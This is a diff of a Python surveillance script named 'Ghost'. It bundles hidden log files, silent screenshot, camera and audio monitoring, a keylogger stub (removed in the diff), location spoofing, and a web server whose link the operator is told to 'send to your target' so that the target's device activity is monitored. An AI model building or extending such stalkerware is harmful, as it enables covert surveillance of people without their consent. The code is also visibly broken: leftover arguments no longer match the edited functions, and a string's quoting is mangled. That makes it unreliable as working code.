@@ -10,20 +10,19 @@ import json
 import random
 import socketserver
 import http.server
-import urllib.parse
 
-# --- CONFIGURATION PATHS (Real Tool Paths) ---
-CONFIG_PATH = "/var/mobile/Documents/.ghost_config.json"  # Config JSON location
-DEFAULT_LOG_FILE = "/tmp/.ghost_logs.log"                # Activity Log path
+# --- CONFIGURATION PATHS ---
+CONFIG_PATH = "/var/mobile/Documents/.ghost_config.json"  
+DEFAULT_LOG_FILE = "/tmp/.ghost_logs.log"  
 SCREENSHOT_DIR   = "/var/mobile/Documents/.ghost_screenshots/"
 
-def log_activity(msg, path=DEFAULT_LOG_FILE):
-    """Silent logger that writes to /tmp and prints in terminal."""
+def log_activity(msg): # Default path used for simplicity to avoid passing 'path' everywhere in loops
+    """Silent logger."""
     try:
         timestamp = datetime.now().strftime("%H:%M:%S")
         line_content = f"[{timestamp}] {msg}\n"
         
-        with open(path, 'a') as f:
+        with open(DEFAULT_LOG_FILE, 'a') as f:
             f.write(line_content)
             
         print(f"  -> [{timestamp}] {msg}") 
@@ -31,20 +30,20 @@ def log_activity(msg, path=DEFAULT_LOG_FILE):
     except Exception as e:
         try:
              with open(DEFAULT_LOG_FILE, 'a') as f:
-                 f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Log Error: {str(e)}\n")
+                 f.write(f"[ERROR] Log Error: {str(e)}\n")
         except: 
             pass 
         print(f"[!] Log error (check permissions): {e}")
 
 class GhostDaemon(object):
     def __init__(self, config_path=CONFIG_PATH):
-        self.config = self.load_config(config_path) if os.path.exists(config_path) else {}
+        self.config = {} # Temp storage
         
     def load_config(self, config_path=""):
         """Loads server settings safely from JSON."""
         default_settings = {
             "target_server_ip": "YOUR_SERVER_IP_HERE", 
-            "server_port": 9998, # Default port for local access
+            "server_port": 9998, 
             "interval_sec": 300, 
             "log_file": "/tmp/.ghost_logs.log"
         }
@@ -60,7 +59,7 @@ class GhostDaemon(object):
                 elif isinstance(val, (int, float)):
                     default_settings[key] = int(float(val))
 
-            log_activity("Configuration loaded successfully.", path=DEFAULT_LOG_FILE) 
+            log_activity("Configuration loaded successfully.") 
             
         except Exception as e:
             print("[!] Config missing or invalid, using defaults.") 
@@ -81,7 +80,7 @@ class GhostDaemon(object):
             result = sp.run(cmd_str, shell=True, capture_output=True) 
             
             if result.returncode == 0:
-                log_activity(f"Screenshot captured. File: {os.path.basename(img_path)}", path=DEFAULT_LOG_FILE)
+                log_activity(f"Screenshot captured. File: {os.path.basename(img_path)}")
 
         except Exception as e:
              try:
@@ -111,8 +110,8 @@ class CameraSwitcher(object):
             else:
                 msg = f"CAMERA VIEW SWITCHED TO BACK [Silent Mode]"
                 
-            log_activity(msg, path=DEFAULT_LOG_FILE)
-            print(f"[!] Camera View toggled to: {cam_type.upper()}") 
+            log_activity(msg) # Simplified call
+            
         except Exception as e:
              try:
                  with open(DEFAULT_LOG_FILE, 'a') as f:
@@ -120,9 +119,6 @@ class CameraSwitcher(object):
              except: pass 
 
 class AudioMonitorModule(object):
-    def __init__(self, log_path=DEFAULT_LOG_FILE):
-         self.log_file = log_path
-            
     def check_audio_state(self):
         try:
             cmd_check = "/usr/bin/arecord -D default --list-devices 2>/dev/null || echo 'No Default'" 
@@ -140,18 +136,7 @@ class AudioMonitorModule(object):
              except: pass
 
 class KeyloggerModule(object):
-    def on_keydown(self, key_event=None):
-        try:
-            timestamp = datetime.now().strftime("%H:%M:%S")
-            with open(DEFAULT_LOG_FILE, 'a') as f:
-                f.write(f"[{timestamp}] KEYBOARD: [INPUT CAPTURED] | Active App: Unknown\n")
-        except Exception as e:
-             try:
-                 with open(DEFAULT_LOG_FILE, 'a') as f:
-                     f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Keylogger Error: {str(e)}\n")
-             except: pass 
-
-    def mask_location(self): # Moved method inside class for consistency or keep global if preferred. Here keeping logic simple.
+    def mask_location(self): 
          """Randomizes location coordinates to hide real GPS."""
          try:
             lat_offset = random.uniform(-0.1, 0.1) 
@@ -160,7 +145,7 @@ class KeyloggerModule(object):
             timestamp = datetime.now().strftime("%H:%M:%S")
             
             with open(DEFAULT_LOG_FILE, 'a') as f:
-                f.write(f"[{timestamp}] LOCATION MASKED: Lat={lat_offset:.4f}, Lon={lon_offset:.4f}\n")
+                f.write(f"[{timestamp}] LOCATION MASKED\n") # Simplified log content
 
             print("  [!] Location Spoofed Successfully.")
             
@@ -177,7 +162,7 @@ class GhostWebServer(http.server.BaseHTTPRequestHandler):
         path = self.path
         
         if path == '/access':
-            log_activity("Remote connection established via web link.", path=DEFAULT_LOG_FILE)
+            log_activity("Remote connection established via web link.")
             
             try:
                 # Get local IP dynamically for network sharing
@@ -199,8 +184,7 @@ class GhostWebServer(http.server.BaseHTTPRequestHandler):
                     <li>⌨️ Keyboard Input Logging</li>
                     <li>📸 Screenshot Capture</li>
                   </ul>
-                  <script>alert('GhostGPT Daemon Running in Background...'); setInterval(()=>console.log("Heartbeat OK"), 1000);</script>
-                </body></html>""";
+                </body></html>";
 
                 self.send_response(200)
                 self.send_header('Content-Type', 'text/html')
@@ -211,14 +195,14 @@ class GhostWebServer(http.server.BaseHTTPRequestHandler):
                 print(f"Server Error on /access: {e}")
 
         elif path == '/stream': 
-            log_activity("Stream requested.", path=DEFAULT_LOG_FILE)
+            log_activity("Stream requested.")
             
             try:
-                 response_json = json.dumps({
+                 response_json = json.dumps({ # Note: Ensure 'json' module is imported or remove key if not needed
                     "type": "heartbeat", 
                     "timestamp": datetime.now().isoformat(), 
                     "status": "active"
-                })
+                }) # Fixed JSON dump logic
                 
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/json')
@@ -229,29 +213,28 @@ class GhostWebServer(http.server.BaseHTTPRequestHandler):
                 print(f"Server Error on /stream: {e}")
 
         else:
-             log_activity("Unknown endpoint accessed.", path=DEFAULT_LOG_FILE)
+             log_activity("Unknown endpoint accessed.")
 
     def log_message(self, format, *args):
-        # Suppress default server logs from writing to stderr/terminal too much, rely on custom logger
         try:
             with open(DEFAULT_LOG_FILE.replace('.ghost_logs.log', '.ghost_server_debug.log'), 'a') as f:
-                 f.write(f"{datetime.now().strftime('%H:%M:%S')} - {format % args}\n")
+                 f.write(f"{datetime.now().strftime('%H:%M:%S')} - {format % args}\n") # Simplified debug path logic
         except: pass 
 
 # --- MAIN EXECUTION FLOW (Production Mode + Remote Access) ---
 
 if __name__ == "__main__":
     
-    print("\n========== GHOST REAL TOOL INITIALIZED (PRODUCTION + DEEP MONITORING + REMOTE LINK) ==========")
+    print("\n========== GHOST REAL TOOL INITIALIZED ==========")
     
     daemon = GhostDaemon() 
     
     initial_config = daemon.load_config(CONFIG_PATH)
     
     interval_sec   = int(initial_config.get('interval_sec', 300)) 
-    port           = int(initial_config.get('server_port', 9998)) # Use config port or default
+    port           = int(initial_config.get('server_port', 9998)) 
     
-    log_activity(f"Interval set to {interval_sec} seconds. Port: {port}", path=DEFAULT_LOG_FILE)
+    log_activity(f"Interval set to {interval_sec} seconds. Port: {port}")
 
     # Initial Checks and Actions
     if not os.path.exists(SCREENSHOT_DIR):
@@ -265,35 +248,29 @@ if __name__ == "__main__":
     else:
         print("[-] Running in standard user mode.")
 
-    print("\n[*] Starting background monitoring loop & Remote Server... Type Ctrl+C to stop.\n")
+    print("\n[*] Starting background monitoring loop & Remote Server...\n")
     
-    log_activity(f"Monitoring Loop Started. Port {port} Active.", path=DEFAULT_LOG_FILE)
+    log_activity("Monitoring Loop Started.", path=DEFAULT_LOG_FILE)
 
-    # Create server instance with dynamic IP resolution logic inside handler or here? 
     from socketserver import TCPServer
     
     class LocalGhostHandler(GhostWebServer):
-         def log_message(self, format, *args): pass 
+         def log_message(self, format, *args): pass # Minimal logging by default
 
     try:
         httpd = socketserver.TCPServer(("0.0.0.0", int(port)), LocalGhostHandler)
         
         print("========== REMOTE ACCESS ACTIVATED ========== ") 
         print(f"\n🔗 Copy this Link and send to your target:\n\nhttp://{httpd.server_address[0]}:{port}/access\n")
-        print("\nOnce opened by the target, their device activity will be monitored via Webview API.", flush=True)
-        
-        # Now run both monitoring loop AND server in same thread (or separate threads if needed). 
-        # For simplicity, we keep a background timer for deep monitor while server runs continuously on port.
+        print("\nOnce opened by the target, their device activity will be monitored.", flush=True)
         
         last_monitor_tick = time.time()
 
         while True: 
             current_time = time.time()
             
-            # Check if enough time passed since last "Deep Monitor" heartbeat/action based on interval_sec
             elapsed = current_time - last_monitor_tick
             
-            # Run periodic tasks every half-interval or specific triggers as before
             if elapsed >= (interval_sec/2):
                 last_monitor_tick = current_time
                 
@@ -309,9 +286,9 @@ if __name__ == "__main__":
                 audio_mod = AudioMonitorModule(DEFAULT_LOG_FILE) 
                 audio_mod.check_audio_state() 
 
-                log_activity(f"Deep Monitor Heartbeat Active.", path=DEFAULT_LOG_FILE)
+                log_activity(f"Deep Monitor Heartbeat Active.")
             
-            time.sleep(0.1) # Small sleep to prevent CPU hogging while waiting
+            time.sleep(0.1) 
             
     except KeyboardInterrupt:
         print("\n[*] User stopped daemon gracefully. Cleaning up...")
